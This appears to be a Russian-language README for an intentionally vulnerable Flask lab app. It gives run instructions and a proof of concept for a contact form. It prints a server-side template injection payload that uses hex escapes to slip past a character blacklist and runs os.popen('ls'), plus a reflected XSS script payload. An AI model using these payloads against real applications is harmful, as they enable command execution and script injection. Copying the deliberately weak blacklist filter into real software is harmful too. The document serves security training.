# vuln-app
#Уязвимая версия приложения

### Инструкция по сборке и запуску приложения

> - git clone "текущий репозиторий"
> - cd app
> - python __init__.py
> - flask приложение будет запущено по адресу http://127.0.0.1:8089

![image](https://github.com/medarov411/vuln-app/assets/60567375/302c807a-5503-411e-a291-bbe552f247ec)



### Proof of Concept

SSTI:

> url - http://127.0.0.1:8089/contact. Контактная форма, с одним полем ввода.

> Настроил блеклист для ssti, чтоб пейлоад был поинтересней. blacklist = [".","[","]","_","join","init","flag"]

> Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

> ![image](https://github.com/medarov411/vuln-app/assets/60567375/0635d79b-576c-4515-8675-169c49209763)





XSS(reflected):
> xss эксплуатируется там же, где и ssti - http://127.0.0.1:8089/contact

> http://127.0.0.1:8089/contact?email=<script>alert(1)</script>

> ![image](https://github.com/medarov411/vuln-app/assets/60567375/0b6d6749-0813-4635-aaf4-69384d24f5f8)



### Дополнительные комментарии
> От себя решил добавить SSTI с фильтрацией, все таки это flask. Не добавить в него ssti, было бы неуважительно :)


